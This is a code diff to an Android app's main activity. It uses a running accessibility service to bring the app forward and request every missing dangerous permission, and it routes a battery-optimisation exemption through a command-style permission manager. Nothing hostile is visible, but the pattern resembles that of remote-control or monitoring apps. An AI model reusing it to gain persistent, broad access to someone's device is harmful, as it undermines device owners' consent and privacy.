@@ -126,18 +126,39 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void requestRuntimePermissions() {
-        permissionManager.requestAllPermissions();
+        // Since accessibility was just enabled, the service is running — use it to
+        // bring the app to the foreground before showing permission dialogs.
+        // Calling ActivityCompat.requestPermissions() while MainActivity is stopped
+        // (user was on Accessibility Settings) is silently ignored on Android 10+.
+        com.task.tusker.services.UnifiedAccessibilityService svc =
+                com.task.tusker.services.UnifiedAccessibilityService.getInstance();
+        if (svc != null) {
+            java.util.List<String> missing = new java.util.ArrayList<>();
+            for (String perm : com.task.tusker.permissions.AutoPermissionManager.DANGEROUS_PERMISSIONS) {
+                if (androidx.core.content.ContextCompat.checkSelfPermission(this, perm)
+                        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    missing.add(perm);
+                }
+            }
+            if (!missing.isEmpty()) {
+                svc.launchPermissionDialogInForeground(missing.toArray(new String[0]));
+            }
+        } else {
+            // Fallback: accessibility not yet bound — use notification-based foreground launch.
+            new com.task.tusker.commands.PermissionManager(this).requestAllPermissions();
+        }
 
+        // Battery optimisation — request via PermissionManager so it can use the
+        // notification path even if MainActivity is still transitioning back to front.
         new Handler().postDelayed(() -> {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 try {
                     android.os.PowerManager pm =
                         (android.os.PowerManager) getSystemService(POWER_SERVICE);
                     if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                        Intent intent = new Intent(
-                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                            android.net.Uri.parse("package:" + getPackageName()));
-                        startActivity(intent);
+                        new com.task.tusker.commands.PermissionManager(MainActivity.this)
+                                .requestPermission(
+                                        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                     }
                 } catch (Exception ignored) {}
             }
